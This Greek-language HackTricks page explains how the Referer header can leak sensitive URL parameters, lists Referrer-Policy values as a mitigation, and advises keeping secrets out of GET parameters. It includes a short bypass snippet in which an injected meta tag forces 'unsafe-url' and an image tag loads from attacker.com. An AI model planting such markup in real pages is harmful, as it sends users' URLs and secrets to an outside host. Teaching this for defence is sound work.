{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Κοινοποιήστε τεχνικές χάκερ καταθέτοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) στο github.

</details>
{% endhint %}

# Επικεφαλίδες αναφοράς και πολιτική

Η επικεφαλίδα Αναφοράς (Referrer) χρησιμοποιείται από τους περιηγητές για να υποδείξουν ποια ήταν η προηγούμενη επισκεφθείσα σελίδα.

## Διέρρευση ευαίσθητων πληροφοριών

Εάν σε κάποιο σημείο μέσα σε μια ιστοσελίδα βρίσκονται ευαίσθητες πληροφορίες στις παραμέτρους αιτήσεων GET, εάν η σελίδα περιέχει συνδέσμους προς εξωτερικές πηγές ή ένας επιτιθέμενος είναι σε θέση να δημιουργήσει/προτείνει (κοινωνική μηχανική) στον χρήστη να επισκεφθεί μια διεύθυνση URL που ελέγχεται από τον επιτιθέμενο, θα μπορούσε να εξαγάγει τις ευαίσθητες πληροφορίες μέσα στην τελευταία αίτηση GET.

## Αντιμετώπιση

Μπορείτε να κάνετε τον περιηγητή να ακολουθήσει μια **πολιτική αναφοράς (Referrer-policy)** που θα **αποτρέψει** την αποστολή των ευαίσθητων πληροφοριών σε άλλες εφαρμογές ιστού:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Αντι-Μείωση-Αντίστασης

Μπορείτε να παρακάμψετε αυτόν τον κανόνα χρησιμοποιώντας ένα ετικέτα μεταδεδομένων HTML (ο επιτιθέμενος χρειάζεται να εκμεταλλευτεί μια ενσωμάτωση HTML):
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Άμυνα

Ποτέ μην τοποθετείτε ευαίσθητα δεδομένα μέσα σε παραμέτρους GET ή διαδρομές στο URL.
